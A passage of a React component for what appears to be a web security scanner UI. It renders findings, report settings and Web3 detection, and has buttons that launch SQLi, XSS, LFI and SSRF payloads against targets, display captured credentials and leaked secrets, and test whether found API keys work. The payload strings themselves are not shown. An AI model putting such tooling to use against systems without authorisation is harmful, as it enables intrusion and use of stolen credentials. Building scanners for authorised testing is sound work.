                                                                                                                <div key={i} className={`p-2 rounded-lg border-l-4 flex items-center justify-between ${loot.type === 'credential' ? 'bg-red-500/5 border-red-500' : 'bg-blue-500/5 border-blue-500'}`}>
                                                                                                                    <div>
                                                                                                                        <div className="text-[8px] uppercase font-bold opacity-50 tracking-widest">{loot.label}</div>
                                                                                                                        <div className="font-mono text-sm text-gray-200 mt-0.5">{loot.value}</div>
                                                                                                                    </div>
                                                                                                                    <button
                                                                                                                        onClick={() => copyToClipboard(loot.value)}
                                                                                                                        className="p-1.5 hover:bg-white/10 rounded transition-colors"
                                                                                                                    >
                                                                                                                        <Copy className="size-3 text-gray-400" />
                                                                                                                    </button>
                                                                                                                </div>
                                                                                                            ))}
                                                                                                        </div>
                                                                                                    )}

                                                                                                    {/* BODY VIEW (CRITICAL TRUNCATION) */}
                                                                                                    {(activeInspectTabs[vuln.id] === 'body' || (!activeInspectTabs[vuln.id] && (!test.extractedLoot || test.extractedLoot.length === 0)) || (activeInspectTabs[vuln.id] !== 'headers' && activeInspectTabs[vuln.id] !== 'loot')) && (
                                                                                                        <div className={`p-4 font-mono text-[11px] leading-relaxed select-all ${darkMode ? 'text-gray-400 bg-slate-950' : 'text-gray-700 bg-white'}`}>
                                                                                                            <div className="mb-4 flex items-center gap-3 border-b border-white/5 pb-2">
                                                                                                                <span className="px-2 py-0.5 bg-green-500/20 text-green-400 rounded text-[10px] font-bold">HTTP {test.response?.status}</span>
                                                                                                                <span className="text-gray-500">{test.response?.statusText}</span>
                                                                                                                {test.response && test.response.body.length > 50000 && (
                                                                                                                    <span className="ml-auto text-orange-400 text-[9px] italic">TRUNCATED (Displaying 50KB of {Math.round(test.response.body.length / 1024)}KB)</span>
                                                                                                                )}
                                                                                                            </div>
                                                                                                            <div className="whitespace-pre-wrap">
                                                                                                                {test.response?.body ? test.response.body.substring(0, 50000) : ''}
                                                                                                                {test.response && test.response.body.length > 50000 && '\n\n[...] Content truncated for performance.'}
                                                                                                            </div>
                                                                                                        </div>
                                                                                                    )}

                                                                                                    {/* HEADERS VIEW */}
                                                                                                    {(activeInspectTabs[vuln.id] === 'headers') && (
                                                                                                        <div className="p-4 bg-slate-900 grid gap-2">
                                                                                                            {Object.entries(test.response?.headers || {}).map(([k, v]) => (
                                                                                                                <div key={k} className="flex gap-4 border-b border-white/5 pb-1 last:border-0">
                                                                                                                    <span className="text-orange-400 font-bold shrink-0 text-[10px] w-32 uppercase tracking-tighter">{k}</span>
                                                                                                                    <span className="text-gray-400 font-mono text-[10px] break-all">{v}</span>
                                                                                                                </div>
                                                                                                            ))}
                                                                                                        </div>
                                                                                                    )}
                                                                                                </div>
                                                                                            </div>
                                                                                        )}
                                                                                    </div>
                                                                                );
                                                                            })()}
                                                                        </div>
                                                                    )}

                                                                    <div className="flex gap-2">
                                                                        <div className="flex-1 relative group">
                                                                            <div className={`p-2 rounded font-mono text-[9px] overflow-x-auto ${darkMode ? 'bg-black/40 border border-slate-700' : 'bg-gray-100 border border-gray-200'}`}>
                                                                                <code className="whitespace-pre-wrap break-all opacity-80">
                                                                                    {generatePoC(vuln)?.[activePocTabs[vuln.id] || 'curl']}
                                                                                </code>
                                                                            </div>
                                                                        </div>
                                                                        <button
                                                                            onClick={(e) => {
                                                                                e.stopPropagation();
                                                                                runExploitTest(vuln);
                                                                            }}
                                                                            disabled={exploitTests.get(vuln.id)?.status === 'running'}
                                                                            className={`px-3 py-1 rounded text-[10px] font-bold h-fit shrink-0 transition-all flex items-center gap-1 ${exploitTests.get(vuln.id)?.status === 'running'
                                                                                ? 'bg-gray-700 text-gray-400 cursor-not-allowed'
                                                                                : 'bg-red-600 hover:bg-red-500 text-white shadow-lg shadow-red-900/20'
                                                                                }`}
                                                                        >
                                                                            {exploitTests.get(vuln.id)?.status === 'running' ? (
                                                                                <>
                                                                                    <Loader2 className="size-2 animate-spin" />
                                                                                    RUNNING...
                                                                                </>
                                                                            ) : (
                                                                                <>
                                                                                    <Zap className="size-2" />
                                                                                    RUN FINDING
                                                                                </>
                                                                            )}
                                                                        </button>
                                                                    </div>

                                                                    {/* Advanced Exploit Lab */}
                                                                    {(() => {
                                                                        const catMap: Record<string, string> = { 'injection': 'sqli', 'sqli': 'sqli', 'xss': 'xss', 'lfi': 'lfi', 'path-traversal': 'lfi', 'rce': 'lfi', 'ssrf': 'ssrf' };
                                                                        const labCat = catMap[vuln.category as string];
                                                                        const labPayloads = labCat ? (EXPLOIT_LAB_LIBRARY as any)[labCat] : null;

                                                                        if (!labPayloads) return null;

                                                                        return (
                                                                            <div className="mt-3">
                                                                                <div className="text-[9px] uppercase tracking-wider text-gray-500 mb-2 font-bold flex items-center gap-1">
                                                                                    <FlaskConical className="size-2.5" />
                                                                                    Advanced Exploit Laboratory
                                                                                </div>
                                                                                <div className="grid grid-cols-2 gap-2">
                                                                                    {labPayloads.map((labVuln: any) => (
                                                                                        <div key={labVuln.name} className={`p-2 rounded border ${darkMode ? 'bg-slate-900/40 border-slate-800' : 'bg-white border-gray-100'}`}>
                                                                                            <div className="flex items-center justify-between mb-1">
                                                                                                <span className="text-[9px] font-bold text-gray-400">{labVuln.name}</span>
                                                                                                <button
                                                                                                    disabled={exploitTests.get(vuln.id)?.status === 'running'}
                                                                                                    onClick={(e) => {
                                                                                                        e.stopPropagation();
                                                                                                        // Smart payload picker
                                                                                                        const p = labVuln.payloads;
                                                                                                        const payload = p.altoro || p.mysql || p.script || p.linux || p.aws || Object.values(p)[0];
                                                                                                        runExploitTest(vuln, payload as string);
                                                                                                    }}
                                                                                                    className="text-[8px] bg-purple-600 hover:bg-purple-500 text-white px-1.5 py-0.5 rounded transition-colors"
                                                                                                >
                                                                                                    LAUNCH
                                                                                                </button>
                                                                                            </div>
                                                                                            <p className="text-[8px] text-gray-600 leading-tight">{labVuln.description}</p>
                                                                                        </div>
                                                                                    ))}
                                                                                </div>
                                                                            </div>
                                                                        );
                                                                    })()}
                                                                </div>
                                                            )}
                                                        </div>
                                                    );
                                                })}

                                                {remaining > 0 && (
                                                    <p className={`text-xs mt-2 text-center ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
                                                        +{remaining} more {liveSeverityFilter || ''} findings...
                                                    </p>
                                                )}
                                            </>
                                        );
                                    })()}
                                </div>

                                {/* Clear filter hint */}
                                {liveSeverityFilter && (
                                    <button
                                        onClick={() => setLiveSeverityFilter(null)}
                                        className={`text-xs mt-2 w-full text-center py-1 rounded ${darkMode ? 'text-cyan-400 hover:bg-slate-700' : 'text-cyan-600 hover:bg-gray-100'
                                            }`}
                                    >
                                        Clear filter - Show all findings
                                    </button>
                                )}
                            </div>
                        )}
                    </div>
                )}
            </div>

            {/* Results */}
            {
                result && (
                    <div className="flex-1 overflow-auto p-4">
                        {/* Summary Cards */}
                        <div className="grid grid-cols-2 md:grid-cols-5 gap-3 mb-6">
                            <div className={`p-4 rounded-lg ${darkMode ? 'bg-red-500/10 border border-red-500/30' : 'bg-red-50 border border-red-200'}`}>
                                <div className="text-2xl font-bold text-red-400">{result?.summary.critical}</div>
                                <div className="text-sm text-red-400">Critical</div>
                            </div>
                            <div className={`p-4 rounded-lg ${darkMode ? 'bg-orange-500/10 border border-orange-500/30' : 'bg-orange-50 border border-orange-200'}`}>
                                <div className="text-2xl font-bold text-orange-400">{result?.summary.high}</div>
                                <div className="text-sm text-orange-400">High</div>
                            </div>
                            <div className={`p-4 rounded-lg ${darkMode ? 'bg-yellow-500/10 border border-yellow-500/30' : 'bg-yellow-50 border border-yellow-200'}`}>
                                <div className="text-2xl font-bold text-yellow-400">{result?.summary.medium}</div>
                                <div className="text-sm text-yellow-400">Medium</div>
                            </div>
                            <div className={`p-4 rounded-lg ${darkMode ? 'bg-blue-500/10 border border-blue-500/30' : 'bg-blue-50 border border-blue-200'}`}>
                                <div className="text-2xl font-bold text-blue-400">{result?.summary.low}</div>
                                <div className="text-sm text-blue-400">Low</div>
                            </div>
                            <div className={`p-4 rounded-lg ${darkMode ? 'bg-gray-500/10 border border-gray-500/30' : 'bg-gray-50 border border-gray-200'}`}>
                                <div className="text-2xl font-bold text-gray-400">{result?.summary.info}</div>
                                <div className="text-sm text-gray-400">Info</div>
                            </div>
                        </div>

                        {/* Report Generation Section - Moved Up */}
                        <div className={`mb-6 p-4 rounded-lg border-2 ${darkMode ? 'border-cyan-500/30 bg-gradient-to-r from-cyan-500/10 to-slate-800/50' : 'border-cyan-300 bg-gradient-to-r from-cyan-50 to-gray-50'}`}>
                            <div className="flex items-center justify-between flex-wrap gap-3">
                                <div className="flex items-center gap-3">
                                    <div className={`p-2 rounded-lg ${darkMode ? 'bg-cyan-500/20' : 'bg-cyan-100'}`}>
                                        <FileDown className="size-5 text-cyan-500" />
                                    </div>
                                    <div>
                                        <h3 className="font-semibold">Generate PDF Report</h3>
                                        <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                            Export comprehensive security assessment
                                        </p>
                                    </div>
                                </div>
                                <div className="flex gap-2">
                                    <button
                                        onClick={() => setShowReportOptions(!showReportOptions)}
                                        className={`px-3 py-2 rounded-lg border ${showReportOptions
                                            ? 'bg-cyan-500/20 border-cyan-500/50 text-cyan-400'
                                            : darkMode
                                                ? 'border-slate-600 hover:bg-slate-700 hover:border-slate-500'
                                                : 'border-gray-300 hover:bg-gray-100'
                                            } transition-colors flex items-center gap-2`}
                                    >
                                        <Settings2 className="size-4" />
                                        <span className="hidden sm:inline">Options</span>
                                    </button>
                                    <button
                                        onClick={handleGeneratePdfReport}
                                        disabled={isGeneratingReport}
                                        className={`px-5 py-2 rounded-lg font-medium flex items-center gap-2 ${isGeneratingReport
                                            ? 'bg-gray-600 cursor-not-allowed'
                                            : 'bg-cyan-600 hover:bg-cyan-700 shadow-lg shadow-cyan-500/25'
                                            } text-white transition-all`}
                                    >
                                        {isGeneratingReport ? (
                                            <>
                                                <Loader2 className="size-4 animate-spin" />
                                                Generating...
                                            </>
                                        ) : (
                                            <>
                                                <Download className="size-4" />
                                                Download PDF
                                            </>
                                        )}
                                    </button>
                                </div>
                            </div>

                            {/* Report Options - Collapsible */}
                            {showReportOptions && (
                                <div className={`mt-4 p-4 rounded-lg ${darkMode ? 'bg-slate-800/80' : 'bg-white border border-gray-200'}`}>
                                    <h4 className="font-medium mb-4">Report Configuration</h4>

                                    <div className="grid md:grid-cols-2 gap-4">
                                        {/* Report Title */}
                                        <div>
                                            <label className={`text-sm font-medium ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                                                Report Title
                                            </label>
                                            <input
                                                type="text"
                                                value={reportOptions.title}
                                                onChange={(e) => setReportOptions({ ...reportOptions, title: e.target.value })}
                                                placeholder="Web Security Assessment Report"
                                                className={`mt-1 w-full px-3 py-2 rounded-lg border ${darkMode
                                                    ? 'bg-slate-700 border-slate-600 text-white'
                                                    : 'bg-white border-gray-300 text-gray-900'
                                                    }`}
                                            />
                                        </div>

                                        {/* Scanner User */}
                                        <div>
                                            <label className={`text-sm font-medium ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                                                Scanner / Analyst Name
                                            </label>
                                            <input
                                                type="text"
                                                value={reportOptions.scannerUser}
                                                onChange={(e) => setReportOptions({ ...reportOptions, scannerUser: e.target.value })}
                                                placeholder="Your name or team"
                                                className={`mt-1 w-full px-3 py-2 rounded-lg border ${darkMode
                                                    ? 'bg-slate-700 border-slate-600 text-white'
                                                    : 'bg-white border-gray-300 text-gray-900'
                                                    }`}
                                            />
                                        </div>

                                        {/* Organization */}
                                        <div>
                                            <label className={`text-sm font-medium ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                                                Organization
                                            </label>
                                            <input
                                                type="text"
                                                value={reportOptions.organization}
                                                onChange={(e) => setReportOptions({ ...reportOptions, organization: e.target.value })}
                                                placeholder="Your organization (optional)"
                                                className={`mt-1 w-full px-3 py-2 rounded-lg border ${darkMode
                                                    ? 'bg-slate-700 border-slate-600 text-white'
                                                    : 'bg-white border-gray-300 text-gray-900'
                                                    }`}
                                            />
                                        </div>

                                        {/* Classification */}
                                        <div>
                                            <label className={`text-sm font-medium ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                                                Classification
                                            </label>
                                            <select
                                                value={reportOptions.classification}
                                                onChange={(e) => setReportOptions({ ...reportOptions, classification: e.target.value as any })}
                                                className={`mt-1 w-full px-3 py-2 rounded-lg border ${darkMode
                                                    ? 'bg-slate-700 border-slate-600 text-white'
                                                    : 'bg-white border-gray-300 text-gray-900'
                                                    }`}
                                            >
                                                <option value="UNCLASSIFIED">UNCLASSIFIED</option>
                                                <option value="CUI">CUI</option>
                                                <option value="CONFIDENTIAL">CONFIDENTIAL</option>
                                                <option value="SECRET">SECRET</option>
                                                <option value="TOP SECRET">TOP SECRET</option>
                                            </select>
                                        </div>
                                    </div>

                                    {/* Content Options */}
                                    <div className="mt-4">
                                        <label className={`text-sm font-medium ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                                            Report Content
                                        </label>
                                        <div className="mt-2 grid grid-cols-2 md:grid-cols-3 gap-3">
                                            <label className="flex items-center gap-2 cursor-pointer">
                                                <input
                                                    type="checkbox"
                                                    checked={reportOptions.includeEvidence}
                                                    onChange={(e) => setReportOptions({ ...reportOptions, includeEvidence: e.target.checked })}
                                                    className="rounded"
                                                />
                                                <span className="text-sm">Include Evidence</span>
                                            </label>
                                            <label className="flex items-center gap-2 cursor-pointer">
                                                <input
                                                    type="checkbox"
                                                    checked={reportOptions.includeExploitation}
                                                    onChange={(e) => setReportOptions({ ...reportOptions, includeExploitation: e.target.checked })}
                                                    className="rounded"
                                                />
                                                <span className="text-sm">How to Exploit</span>
                                            </label>
                                            <label className="flex items-center gap-2 cursor-pointer">
                                                <input
                                                    type="checkbox"
                                                    checked={reportOptions.includeRemediation}
                                                    onChange={(e) => setReportOptions({ ...reportOptions, includeRemediation: e.target.checked })}
                                                    className="rounded"
                                                />
                                                <span className="text-sm">How to Fix</span>
                                            </label>
                                            <label className="flex items-center gap-2 cursor-pointer">
                                                <input
                                                    type="checkbox"
                                                    checked={reportOptions.includeCompliance}
                                                    onChange={(e) => setReportOptions({ ...reportOptions, includeCompliance: e.target.checked })}
                                                    className="rounded"
                                                />
                                                <span className="text-sm">Compliance Mapping</span>
                                            </label>
                                            <label className="flex items-center gap-2 cursor-pointer">
                                                <input
                                                    type="checkbox"
                                                    checked={reportOptions.includeTechnicalDetails}
                                                    onChange={(e) => setReportOptions({ ...reportOptions, includeTechnicalDetails: e.target.checked })}
                                                    className="rounded"
                                                />
                                                <span className="text-sm">Technical Details</span>
                                            </label>
                                            <label className="flex items-center gap-2 cursor-pointer">
                                                <input
                                                    type="checkbox"
                                                    checked={reportOptions.redactSensitive}
                                                    onChange={(e) => setReportOptions({ ...reportOptions, redactSensitive: e.target.checked })}
                                                    className="rounded"
                                                />
                                                <span className="text-sm">Redact Sensitive Data</span>
                                            </label>
                                        </div>
                                    </div>
                                </div>
                            )}
                        </div>

                        {/* Risk Score & Web3 Detection */}
                        <div className="grid md:grid-cols-2 gap-4 mb-6">
                            {/* Risk Score */}
                            <div className={`p-4 rounded-lg ${darkMode ? 'bg-slate-800' : 'bg-gray-50'}`}>
                                <h3 className="font-medium mb-3 flex items-center gap-2">
                                    <Shield className="size-4" />
                                    Risk Assessment
                                </h3>
                                <div className="flex items-center gap-4">
                                    <div className={`text-4xl font-bold ${getRiskColor(result.summary.riskLevel)}`}>
                                        {result.summary.riskScore}
                                    </div>
                                    <div>
                                        <div className={`text-lg font-medium ${getRiskColor(result.summary.riskLevel)}`}>
                                            {result.summary.riskLevel.toUpperCase()} RISK
                                        </div>
                                        <div className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                            {result.summary.webVulns} web • {result.summary.blockchainVulns} blockchain
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* Web3 Detection */}
                            <div className={`p-4 rounded-lg ${darkMode ? 'bg-slate-800' : 'bg-gray-50'}`}>
                                <h3 className="font-medium mb-3 flex items-center gap-2">
                                    <Wallet className="size-4" />
                                    Web3/Blockchain Detection
                                </h3>
                                {result.web3Detection?.hasWeb3 ? (
                                    <div className="space-y-2">
                                        <div className="flex items-center gap-2 text-cyan-400">
                                            <CheckCircle2 className="size-4" />
                                            <span>Web3 Integration Detected</span>
                                        </div>
                                        {result.web3Detection.provider && (
                                            <div className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                                <span className="font-medium">Wallet:</span> {result.web3Detection.provider}
                                            </div>
                                        )}
                                        {(result.web3Detection as any).detectedChains?.length > 0 && (
                                            <div className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                                <span className="font-medium">Chains:</span> {(result.web3Detection as any).detectedChains.join(', ')}
                                            </div>
                                        )}
                                        {(result.web3Detection as any).detectedLibraries?.length > 0 && (
                                            <div className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                                <span className="font-medium">Libraries:</span> {(result.web3Detection as any).detectedLibraries.slice(0, 5).join(', ')}
                                                {(result.web3Detection as any).detectedLibraries.length > 5 && ` +${(result.web3Detection as any).detectedLibraries.length - 5} more`}
                                            </div>
                                        )}
                                        {(result.web3Detection as any).detectedFeatures?.length > 0 && (
                                            <div className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                                <span className="font-medium">DeFi:</span> {(result.web3Detection as any).detectedFeatures.slice(0, 4).join(', ')}
                                            </div>
                                        )}
                                        {result.web3Detection.contracts.length > 0 && (
                                            <div className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                                <span className="font-medium">Contracts:</span> {result.web3Detection.contracts.length} detected
                                            </div>
                                        )}
                                        {result.web3Detection.rpcEndpoints.length > 0 && (
                                            <div className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                                <span className="font-medium">RPC Endpoints:</span> {result.web3Detection.rpcEndpoints.length} found
                                            </div>
                                        )}
                                    </div>
                                ) : (
                                    <div className="flex items-center gap-2 text-gray-400">
                                        <XCircle className="size-4" />
                                        <span>No Web3 Integration Detected</span>
                                    </div>
                                )}
                            </div>
                        </div>

                        {/* Security Headers Score */}
                        {result.headerAnalysis && (
                            <div className={`p-4 rounded-lg mb-6 ${darkMode ? 'bg-slate-800' : 'bg-gray-50'}`}>
                                <h3 className="font-medium mb-3 flex items-center gap-2">
                                    <Server className="size-4" />
                                    Security Headers Score: {result.headerAnalysis.score.toFixed(0)}%
                                </h3>
                                <div className={`h-2 rounded-full ${darkMode ? 'bg-slate-700' : 'bg-gray-200'}`}>
                                    <div
                                        className={`h-full rounded-full ${result.headerAnalysis.score >= 70 ? 'bg-green-500' :
                                            result.headerAnalysis.score >= 40 ? 'bg-yellow-500' : 'bg-red-500'
                                            }`}
                                        style={{ width: `${result.headerAnalysis.score}%` }}
                                    />
                                </div>
                                {result.headerAnalysis.missing.length > 0 && (
                                    <div className="mt-2 flex flex-wrap gap-1">
                                        {result.headerAnalysis.missing.slice(0, 5).map(h => (
                                            <span key={h} className={`text-xs px-2 py-1 rounded ${darkMode ? 'bg-red-500/20 text-red-400' : 'bg-red-100 text-red-600'}`}>
                                                Missing: {h}
                                            </span>
                                        ))}
                                    </div>
                                )}
                            </div>
                        )}

                        {/* Recommendations */}
                        {result.recommendations.length > 0 && (
                            <div className={`p-4 rounded-lg mb-6 ${darkMode ? 'bg-slate-800' : 'bg-gray-50'}`}>
                                <h3 className="font-medium mb-3 flex items-center gap-2">
                                    <Zap className="size-4" />
                                    Recommendations
                                </h3>
                                <ul className="space-y-2">
                                    {result.recommendations.map((rec, i) => (
                                        <li key={i} className={`text-sm ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                                            {rec}
                                        </li>
                                    ))}
                                </ul>
                            </div>
                        )}

                        {/* View Switcher */}
                        <div className="flex items-center justify-between mb-4">
                            <div className="flex space-x-2 bg-gray-100 dark:bg-slate-700 p-1 rounded-lg">
                                <button
                                    onClick={() => setActiveView('list')}
                                    className={`px-3 py-1.5 text-sm font-medium rounded-md transition-all flex items-center gap-2 ${activeView === 'list' ? 'bg-white dark:bg-slate-600 shadow text-indigo-600 dark:text-indigo-400' : 'text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300'}`}
                                >
                                    <FileText className="size-4" />
                                    Findings
                                </button>
                                <button
                                    onClick={() => setActiveView('map')}
                                    className={`px-3 py-1.5 text-sm font-medium rounded-md transition-all flex items-center gap-2 ${activeView === 'map' ? 'bg-white dark:bg-slate-600 shadow text-indigo-600 dark:text-indigo-400' : 'text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300'}`}
                                >
                                    <Globe className="size-4" />
                                    Attack Map
                                </button>
                            </div>
                        </div>

                        {activeView === 'map' ? (
                            <div className={`h-[600px] border rounded-lg overflow-hidden ${darkMode ? 'border-slate-700 bg-slate-900' : 'border-gray-200 bg-gray-50'}`}>
                                <ScanMap
                                    crawlResults={result.crawlResults || []}
                                    vulnerabilities={result.vulnerabilities}
                                />
                            </div>
                        ) : (
                            <>
                                {/* Vulnerability Filters */}
                                <div className="flex flex-wrap gap-2 mb-4">
                                    <button
                                        onClick={() => setSeverityFilter(null)}
                                        className={`px-3 py-1 rounded-full text-sm ${severityFilter === null
                                            ? 'bg-cyan-500 text-white'
                                            : darkMode ? 'bg-slate-700 text-gray-300' : 'bg-gray-200 text-gray-700'
                                            }`}
                                    >
                                        All ({result.vulnerabilities.length})
                                    </button>
                                    {['critical', 'high', 'medium', 'low', 'info'].map(sev => {
                                        const count = result.vulnerabilities.filter(v => v.severity === sev).length;
                                        if (count === 0) return null;
                                        return (
                                            <button
                                                key={sev}
                                                onClick={() => setSeverityFilter(severityFilter === sev ? null : sev)}
                                                className={`px-3 py-1 rounded-full text-sm capitalize ${severityFilter === sev
                                                    ? `${severityColors[sev as keyof typeof severityColors].bg} ${severityColors[sev as keyof typeof severityColors].text}`
                                                    : darkMode ? 'bg-slate-700 text-gray-300' : 'bg-gray-200 text-gray-700'
                                                    }`}
                                            >
                                                {sev} ({count})
                                            </button>
                                        );
                                    })}
                                </div>

                                {/* Vulnerabilities List */}
                                <div className="space-y-3">
                                    {filteredVulns.map((vuln) => (
                                        <div
                                            key={vuln.id}
                                            className={`rounded-lg border ${darkMode ? 'bg-slate-800 border-slate-700' : 'bg-white border-gray-200'}`}
                                        >
                                            <button
                                                onClick={() => setExpandedVuln(expandedVuln === vuln.id ? null : vuln.id)}
                                                className="w-full p-4 flex items-start gap-3 text-left"
                                            >
                                                <div className={`p-1.5 rounded ${severityColors[vuln.severity].bg}`}>
                                                    {categoryIcons[vuln.category] || <AlertCircle className="size-4" />}
                                                </div>
                                                <div className="flex-1 min-w-0">
                                                    <div className="flex items-center gap-2 flex-wrap">
                                                        <span className={`px-2 py-0.5 rounded text-xs font-medium uppercase ${severityColors[vuln.severity].bg} ${severityColors[vuln.severity].text}`}>
                                                            {vuln.severity}
                                                        </span>
                                                        <span className={`px-2 py-0.5 rounded text-xs ${darkMode ? 'bg-slate-700 text-gray-400' : 'bg-gray-100 text-gray-600'}`}>
                                                            {vuln.category}
                                                        </span>
                                                        {vuln.owasp && (
                                                            <span className={`px-2 py-0.5 rounded text-xs ${darkMode ? 'bg-purple-500/20 text-purple-400' : 'bg-purple-100 text-purple-600'}`}>
                                                                OWASP {vuln.owasp}
                                                            </span>
                                                        )}
                                                        {vuln.cwe && (
                                                            <span className={`px-2 py-0.5 rounded text-xs ${darkMode ? 'bg-slate-700 text-gray-400' : 'bg-gray-100 text-gray-600'}`}>
                                                                {vuln.cwe}
                                                            </span>
                                                        )}
                                                    </div>
                                                    <h4 className="font-medium mt-1">{vuln.title}</h4>
                                                    {vuln.url && (
                                                        <p className={`text-sm truncate ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>
                                                            {vuln.url}
                                                        </p>
                                                    )}
                                                </div>
                                                {expandedVuln === vuln.id ? (
                                                    <ChevronUp className="size-5 text-gray-400" />
                                                ) : (
                                                    <ChevronDown className="size-5 text-gray-400" />
                                                )}
                                            </button>

                                            {expandedVuln === vuln.id && (
                                                <div className={`px-4 pb-4 border-t ${darkMode ? 'border-slate-700' : 'border-gray-200'}`}>
                                                    <div className="pt-4 space-y-4">
                                                        <div>
                                                            <h5 className={`text-sm font-medium mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Description</h5>
                                                            <p className={`text-sm ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>{vuln.description}</p>
                                                        </div>

                                                        {/* Secret/API Key specific detailed display */}
                                                        {(vuln as any).secretService && (
                                                            <div className={`p-4 rounded-lg ${darkMode ? 'bg-red-900/20 border border-red-700/50' : 'bg-red-50 border border-red-200'}`}>
                                                                <div className="flex items-center gap-3 mb-3">
                                                                    <span className={`px-3 py-1 rounded-lg text-sm font-bold ${darkMode ? 'bg-red-700 text-white' : 'bg-red-600 text-white'}`}>
                                                                        {(vuln as any).secretService}
                                                                    </span>
                                                                    {(vuln as any).secretServiceDesc && (
                                                                        <span className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                                                            {(vuln as any).secretServiceDesc}
                                                                        </span>
                                                                    )}
                                                                </div>

                                                                {/* The actual secret value */}
                                                                <div className="mb-3">
                                                                    <h5 className={`text-xs font-medium mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                                                        {(vuln as any).secretType === 'api_key' ? 'API KEY VALUE' : 'SECRET VALUE'}
                                                                    </h5>
                                                                    <div className={`p-2 rounded font-mono text-sm ${darkMode ? 'bg-slate-900' : 'bg-white border'}`}>
                                                                        <code className="whitespace-pre-wrap break-all select-all text-red-500 font-bold">
                                                                            {(vuln as any).secretValue}
                                                                        </code>
                                                                    </div>
                                                                    <button
                                                                        onClick={() => copyToClipboard((vuln as any).secretValue || '')}
                                                                        className={`mt-2 text-xs px-2 py-1 rounded ${darkMode ? 'bg-slate-700 hover:bg-slate-600 text-gray-300' : 'bg-gray-200 hover:bg-gray-300 text-gray-700'}`}
                                                                    >
                                                                        Copy Value
                                                                    </button>
                                                                </div>

                                                                {/* Location details */}
                                                                <div className="mb-3 grid grid-cols-2 gap-2 text-xs">
                                                                    <div>
                                                                        <span className={darkMode ? 'text-gray-500' : 'text-gray-500'}>Location:</span>
                                                                        <span className={`ml-2 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>{vuln.location}</span>
                                                                    </div>
                                                                    {(vuln as any).secretLine && (
                                                                        <div>
                                                                            <span className={darkMode ? 'text-gray-500' : 'text-gray-500'}>Line:</span>
                                                                            <span className={`ml-2 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>~{(vuln as any).secretLine}</span>
                                                                        </div>
                                                                    )}
                                                                    <div>
                                                                        <span className={darkMode ? 'text-gray-500' : 'text-gray-500'}>Confidence:</span>
                                                                        <span className={`ml-2 font-medium capitalize ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>{(vuln as any).secretConfidence || 'high'}</span>
                                                                    </div>
                                                                </div>

                                                                {/* Security impact */}
                                                                {(vuln as any).secretImpact && (
                                                                    <div className="mb-3">
                                                                        <h5 className={`text-xs font-medium mb-1 ${darkMode ? 'text-yellow-400' : 'text-yellow-600'}`}>SECURITY IMPACT</h5>
                                                                        <p className={`text-xs ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                                                                            {(vuln as any).secretImpact}
                                                                        </p>
                                                                    </div>
                                                                )}

                                                                {/* Code context */}
                                                                {(vuln as any).secretContext && (
                                                                    <div>
                                                                        <h5 className={`text-xs font-medium mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>CODE CONTEXT</h5>
                                                                        <div className={`p-2 rounded font-mono text-xs overflow-x-auto ${darkMode ? 'bg-slate-900' : 'bg-gray-100'}`}>
                                                                            <code className="whitespace-pre-wrap break-all select-all">
                                                                                {(vuln as any).secretContext}
                                                                            </code>
                                                                        </div>
                                                                    </div>
                                                                )}

                                                                {/* API Key Exploit Test Section */}
                                                                {(vuln as any).secretType === 'api_key' && (vuln as any).secretService && (
                                                                    <div className={`mt-4 p-3 rounded-lg ${darkMode ? 'bg-slate-800 border border-slate-600' : 'bg-gray-100 border border-gray-300'}`}>
                                                                        <div className="flex items-center justify-between mb-3">
                                                                            <h5 className={`text-sm font-medium flex items-center gap-2 ${darkMode ? 'text-purple-400' : 'text-purple-600'}`}>
                                                                                <FlaskConical className="size-4" />
                                                                                Exploit Verification
                                                                            </h5>
                                                                            {!apiKeyTests.get(vuln.id) && (
                                                                                <button
                                                                                    onClick={() => testApiKey(vuln.id, (vuln as any).secretService, (vuln as any).secretValue)}
                                                                                    className={`flex items-center gap-2 px-3 py-1.5 rounded text-sm font-medium transition-colors ${darkMode
                                                                                        ? 'bg-purple-600 hover:bg-purple-500 text-white'
                                                                                        : 'bg-purple-500 hover:bg-purple-600 text-white'
                                                                                        }`}
                                                                                >
                                                                                    <Play className="size-3" />
                                                                                    Test Key
                                                                                </button>
                                                                            )}
                                                                        </div>

                                                                        {/* Test Results */}
                                                                        {apiKeyTests.get(vuln.id) && (
                                                                            <div>
                                                                                {/* Status message */}
                                                                                <div className={`mb-3 p-2 rounded text-sm ${apiKeyTests.get(vuln.id)?.status === 'testing'
                                                                                    ? (darkMode ? 'bg-blue-900/30 text-blue-300' : 'bg-blue-100 text-blue-700')
                                                                                    : apiKeyTests.get(vuln.id)?.exploitable
                                                                                        ? (darkMode ? 'bg-red-900/30 text-red-300' : 'bg-red-100 text-red-700')
                                                                                        : (darkMode ? 'bg-green-900/30 text-green-300' : 'bg-green-100 text-green-700')
                                                                                    }`}>
